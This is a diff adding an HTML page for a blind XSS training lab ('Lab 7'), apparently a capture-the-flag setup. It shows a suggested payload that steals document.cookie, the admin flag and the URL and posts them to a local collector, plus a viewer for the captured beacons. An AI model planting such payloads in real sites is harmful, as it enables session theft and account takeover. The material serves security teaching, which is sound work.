@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Lab 7 — Blind XSS Verify</title>
+  <style>
+    body{font-family:monospace;background:#0d1117;color:#e6edf3;padding:20px;}
+    .panel{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin-bottom:16px;}
+    button{background:#238636;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:14px;margin-right:8px;}
+    .entry{border-bottom:1px solid #30363d;padding:8px 0;word-break:break-all;font-size:12px;}
+    .ts{color:#7d8590;}
+    code{background:#1c2128;border:1px solid #30363d;padding:2px 6px;border-radius:3px;color:#ffa657;}
+  </style>
+</head>
+<body>
+<h2 style="color:#f85149;">Lab 7 — Blind XSS Verification</h2>
+<p style="color:#7d8590;margin:12px 0;">Monitor exfil beacons. When your payload fires in the admin panel, the flag arrives here.</p>
+
+<div class="panel">
+  <h3 style="margin-bottom:12px;">Suggested payload for the contact form:</h3>
+  <pre style="background:#1c2128;padding:12px;border-radius:6px;overflow-x:auto;font-size:12px;color:#3fb950;">&lt;img src=x onerror="fetch('http://localhost:3001/log',{
+  method:'POST',
+  headers:{'Content-Type':'application/json'},
+  body: JSON.stringify({
+    lab: 'lab7',
+    flag: typeof ADMIN_FLAG !== 'undefined' ? ADMIN_FLAG : 'not-found',
+    cookie: document.cookie,
+    url: location.href
+  })
+})"&gt;</pre>
+</div>
+
+<div class="panel">
+  <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px;">
+    <h3>Exfil Log</h3>
+    <span id="count" style="color:#7d8590;font-size:12px;">0 entries</span>
+    <button onclick="loadLog()">Refresh</button>
+    <span id="auto" style="color:#7d8590;font-size:12px;">(auto-refreshing every 5s)</span>
+  </div>
+  <div id="log">No beacons yet.</div>
+</div>
+
+<script>
+async function loadLog() {
+  const res = await fetch('/log');
+  const data = await res.json();
+  const el = document.getElementById('log');
+  document.getElementById('count').textContent = data.length + ' entries';
+  if (!data.length) { el.textContent = 'No beacons yet. Submit the payload in Lab 7 and wait for the admin bot.'; return; }
+  el.innerHTML = data.map(e =>
+    `<div class="entry"><div class="ts">${e.ts}</div><div style="color:#3fb950;margin-top:4px;">${JSON.stringify(e).replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div></div>`
+  ).join('');
+}
+loadLog();
+setInterval(loadLog, 5000);
+</script>
+</body>
+</html>
